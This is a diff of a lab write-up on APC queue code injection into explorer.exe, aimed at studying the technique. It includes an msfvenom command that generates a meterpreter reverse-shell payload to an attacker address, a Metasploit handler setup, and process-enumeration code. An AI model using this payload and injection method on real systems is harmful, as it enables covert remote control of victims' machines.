@@ -1,26 +1,30 @@
 # APC Queue Code Injection
 
-This lab looks at the APC queue code injection technique.
+This lab looks at the APC \(Asynchronous Procedure Calls\) queue code injection technique.
 
-* Threads execute code withing processes 
-* Threads can execute functions \(code\) asynchronously by leveraging asynchronous procedure calls \(APC\)
-* Each thread has a queue that stores all the APCs and application can request an APC to be executed in a thread by putting it in the APC queue
-* When the thread is executed, the APC will be executed
-* Disadvantage of this technique is that the malicious program cannot force the victim process to execute the injected code - the thread needs to enter an [alertable](apc-queue-code-injection.md#alertable-state) state \(i.e [`SleepEx`](https://msdn.microsoft.com/en-us/library/ms686307%28v=VS.85%29.aspx)\)
+Some context around threads and APCs:
+
+* Threads execute code within processes
+* Threads can execute code asynchronously by leveraging APC queues
+* Each thread has a queue that stores all the APCs
+* Application can queue an APC to a given thread
+* When a thread is scheduled, any queued APCs will be executed
+* Disadvantage of this technique is that the malicious program cannot force the victim thread to execute the injected code - the thread to which an APC was queued to, needs to enter/be in an [alertable](apc-queue-code-injection.md#alertable-state) state \(i.e [`SleepEx`](https://msdn.microsoft.com/en-us/library/ms686307%28v=VS.85%29.aspx)\)
 
 ## Execution
 
-High level overview of how this lab works:
+A high level overview of how this lab works:
 
-* Find explorer.exe process ID
-* Allocate memory in explorer.exe process memory space
-* Write shellcode to that memory space
-* Find all threads in explorer.exe
-* Queue an APC call in all those threads. APC points to the shellcode
-* When threads get scheduled, shellcode gets executed
-* Rain of meterpreter sessions
+* Write a C++ program apcqueue.exe that will:
+  * Find explorer.exe process ID
+  * Allocate memory in explorer.exe process memory space
+  * Write shellcode to that memory location
+  * Find all threads in explorer.exe
+  * Queue an APC to all those threads. APC points to the shellcode
+* When threads get scheduled, the shellcode gets executed
+* Rain of meterpreter shells
 
-Let's start by creating a meterpreter shellocde to be injected into the victim process:
+Let's start by creating a meterpreter shellcode to be injected into the victim process:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@kali" %}
@@ -32,7 +36,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
 
 ![](../../.gitbook/assets/annotation-2019-05-26-111814.png)
 
-I will be injecting the shellcode into explorer.exe since there's usually a lot of thread activity going on. I will find the process I want to inject into with `Process32First` and `Process32Next` calls:
+I will be injecting the shellcode into `explorer.exe` since there's usually a lot of thread activity going on, so there is a better chance that at least one thread will execute the injected shellcode. I will find the process I want to inject into with `Process32First` and `Process32Next` calls:
 
 ```cpp
 	if (Process32First(snapshot, &processEntry)) {
@@ -42,7 +46,11 @@ I will be injecting the shellcode into explorer.exe since there's usually a lot 
 	}
 ```
 
-Once new memory is allocated in explorer.exe and shellcode is written to the process, we can see the shellcode OK in the process:
+Once explorer PID is found and memory is allocated in explorer.exe, the shellcode is written to explorer's process memory. Additionally, an APC routine, which now points to the shellcode, is declared:
+
+![](../../.gitbook/assets/annotation-2019-05-26-151203.png)
+
+We can indeed see the shellcode got injected in the process successully:
 
 ![](../../.gitbook/assets/annotation-2019-05-26-133126.png)
 
@@ -50,7 +58,11 @@ A quick detour - the below shows a screenshot from the Process Hacker where our 
 
 ![](../../.gitbook/assets/annotation-2019-05-26-133312.png)
 
-Back to the attacking machine - let's fire up a multi handler and set an autorunscript to migrate the meterpreter sessions to some other process before it dies with the dying threads:
+Back to the code - we can now enumerate all threads of explorer.exe and queue an APC to them:
+
+![sleep for some throttling](../../.gitbook/assets/annotation-2019-05-26-151757.png)
+
+Switching gear to the attacking machine - let's fire up a multi handler and set an `autorunscript` to migrate meterpreter sessions to some other process before they die with dying threads:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@kali" %}
@@ -60,6 +72,8 @@ set autorunscript post/windows/manage/migrate
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
+
+Once the `apcqueue` is compiled and run,  a meterpreter session is received:
 
 ![](../../.gitbook/assets/annotation-2019-05-26-134126.png)
 
@@ -80,9 +94,9 @@ Let's put the new project to sleep in both alertable and non-alertable states an
 
 ### Alertable State
 
-Let's compile the new project binary with `bAleertable = true` first and then launch the `apcqueue.exe` to queue the APC. 
+Let's compile the `alertable.exe` binary with `bAleertable = true` first and then launch the `apcqueue.exe` to queue the APC. 
 
-Since alertable.exe was in an alertable state, the code got executed immediately and a meterpreter session was established:
+Since `alertable.exe` was in an alertable state, the code got executed immediately and a meterpreter session was established:
 
 ![](../../.gitbook/assets/apcqueueinjection.gif)
 
@@ -95,7 +109,7 @@ Now let's recompile `alertable.exe` with `bAlertable == false` and try again - y
 ## Code
 
 {% code-tabs %}
-{% code-tabs-item title="apcqueue-injection.cpp" %}
+{% code-tabs-item title="apcqueue.cpp" %}
 ```cpp
 #include "pch.h"
 #include <iostream>
